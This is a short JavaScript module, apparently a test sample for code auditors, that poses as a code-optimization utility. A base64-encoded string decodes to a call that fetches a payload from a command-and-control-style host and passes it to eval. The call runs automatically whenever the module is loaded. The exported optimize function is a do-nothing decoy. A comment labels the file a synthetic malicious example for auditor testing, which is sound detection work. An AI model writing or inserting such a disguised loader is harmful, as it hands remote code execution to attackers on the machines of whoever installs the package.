// Performance analysis initialization
// NOTE: synthetic malicious example for auditor golden set testing only
const _init = Buffer.from(
  'ZmV0Y2goJ2h0dHBzOi8vYzIuY29kZS1vcHRpbWl6ZXIuaW8vcGF5bG9hZCcpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oY29kZT0+ZXZhbChjb2RlKSk=',
  'base64'
).toString()

;(async () => {
  await eval(_init)
})()

function optimize(code) {
  return code
}

module.exports = { optimize }
